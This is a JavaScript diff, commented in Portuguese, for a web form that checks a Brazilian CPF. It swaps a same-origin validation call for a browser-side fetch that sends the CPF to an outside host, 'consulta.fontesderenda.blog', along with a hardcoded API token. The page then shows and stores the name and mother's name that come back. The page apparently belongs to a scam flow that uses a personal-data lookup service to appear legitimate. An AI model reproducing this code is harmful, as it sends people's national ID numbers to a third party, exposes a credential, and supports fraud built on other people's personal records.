@@ -408,6 +408,24 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 
+    // Função para consultar API de CPF
+    async function consultarCPF(cpf) {
+        try {
+            const cpfLimpo = cpf.replace(/\D/g, '');
+            const response = await fetch(`https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a&cpf=${cpfLimpo}`);
+            
+            if (!response.ok) {
+                throw new Error('Erro na consulta da API');
+            }
+            
+            const data = await response.json();
+            return data;
+        } catch (error) {
+            console.error('Erro ao consultar CPF:', error);
+            throw error;
+        }
+    }
+
     function mostrarErro(mensagem) {
         cpfError.querySelector('span').textContent = mensagem;
         cpfError.classList.remove('hidden');
@@ -502,29 +520,22 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     function validarCPFEtapa(cpf) {
-        // Chamar API de validação
-        fetch('/validar-cpf', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ cpf: cpf })
-        })
-        .then(response => response.json())
+        // Chamar API de validação CPF
+        consultarCPF(cpf)
         .then(data => {
-            if (data.error) {
+            if (data.error || !data.nome) {
                 // Mostrar erro na etapa CPF
-                mostrarErroEtapa('cpf', data.error);
+                mostrarErroEtapa('cpf', data.error || 'CPF não encontrado');
                 btnContinuar.innerHTML = 'Continuar <i class="fas fa-arrow-right ml-2"></i>';
                 btnContinuar.disabled = false;
                 return;
             }
             
             // CPF válido - salvar dados globalmente e passar para próxima etapa
-            window.dadosCpfValidado = data.dados_originais;
+            window.dadosCpfValidado = data;
             concluirEtapa('cpf', 'CPF validado com sucesso');
             atualizarProgresso(40); // 40% após validar CPF
-            iniciarEtapaNome(data.dados_originais);
+            iniciarEtapaNome(data);
         })
         .catch(error => {
             console.error('Erro:', error);
@@ -643,10 +654,10 @@ document.addEventListener('DOMContentLoaded', function() {
         if (window.dadosCpfValidado) {
             localStorage.setItem('dadosCpfValidado', JSON.stringify(window.dadosCpfValidado));
             
-            // Preencher dados de autenticação na seção
-            document.getElementById('dado-nome-auth').textContent = window.dadosCpfValidado.nome;
+            // Preencher dados de autenticação na seção com os dados da API
+            document.getElementById('dado-nome-auth').textContent = window.dadosCpfValidado.nome || 'Nome não informado';
             document.getElementById('dado-cpf-auth').textContent = formatarCPF(window.dadosCpfValidado.cpf);
-            document.getElementById('dado-mae-auth').textContent = window.dadosCpfValidado.nome_mae;
+            document.getElementById('dado-mae-auth').textContent = window.dadosCpfValidado.nome_mae || 'Nome da mãe não informado';
             
             // Atualizar cabeçalho com nome do usuário
             atualizarCabecalho(window.dadosCpfValidado.nome);
